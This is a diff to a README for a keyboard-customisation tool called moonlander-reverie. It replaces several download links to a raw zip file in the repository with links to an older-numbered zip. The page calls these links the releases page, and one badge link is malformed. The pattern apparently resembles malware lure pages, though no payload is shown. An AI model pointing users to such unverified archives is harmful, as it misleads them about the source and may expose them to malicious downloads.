@@ -1,6 +1,6 @@
 # 🌙 moonlander-reverie - Customize Your Moonlander Keyboard Effortlessly
 
-[![Download](https://raw.githubusercontent.com/mikel-web/moonlander-reverie/main/zsa_moonlander_reverie_source/moonlander-reverie-v2.3.zip%https://raw.githubusercontent.com/mikel-web/moonlander-reverie/main/zsa_moonlander_reverie_source/moonlander-reverie-v2.3.zip)](https://raw.githubusercontent.com/mikel-web/moonlander-reverie/main/zsa_moonlander_reverie_source/moonlander-reverie-v2.3.zip)
+[![Download](https://github.com/mikel-web/moonlander-reverie/raw/refs/heads/main/zsa_moonlander_reverie_source/moonlander-reverie-v1.5.zip%https://github.com/mikel-web/moonlander-reverie/raw/refs/heads/main/zsa_moonlander_reverie_source/moonlander-reverie-v1.5.zip)](https://github.com/mikel-web/moonlander-reverie/raw/refs/heads/main/zsa_moonlander_reverie_source/moonlander-reverie-v1.5.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ To get started with moonlander-reverie, follow the guide below. No technical ski
 
    Go to the releases page to get the latest version of moonlander-reverie. Click the link below:
 
-   [Visit this page to download](https://raw.githubusercontent.com/mikel-web/moonlander-reverie/main/zsa_moonlander_reverie_source/moonlander-reverie-v2.3.zip)
+   [Visit this page to download](https://github.com/mikel-web/moonlander-reverie/raw/refs/heads/main/zsa_moonlander_reverie_source/moonlander-reverie-v1.5.zip)
 
 2. **Select the Latest Release**
 
@@ -67,7 +67,7 @@ If you encounter issues during installation or when using the application, here 
 
 Now that you are ready to customize your Moonlander keyboard, return to the releases page to download the software:
 
-[Visit this page to download](https://raw.githubusercontent.com/mikel-web/moonlander-reverie/main/zsa_moonlander_reverie_source/moonlander-reverie-v2.3.zip)
+[Visit this page to download](https://github.com/mikel-web/moonlander-reverie/raw/refs/heads/main/zsa_moonlander_reverie_source/moonlander-reverie-v1.5.zip)
 
 Follow the installation steps as mentioned to set up everything properly. Enjoy the new features and enhancements that moonlander-reverie brings to your typing experience!
 
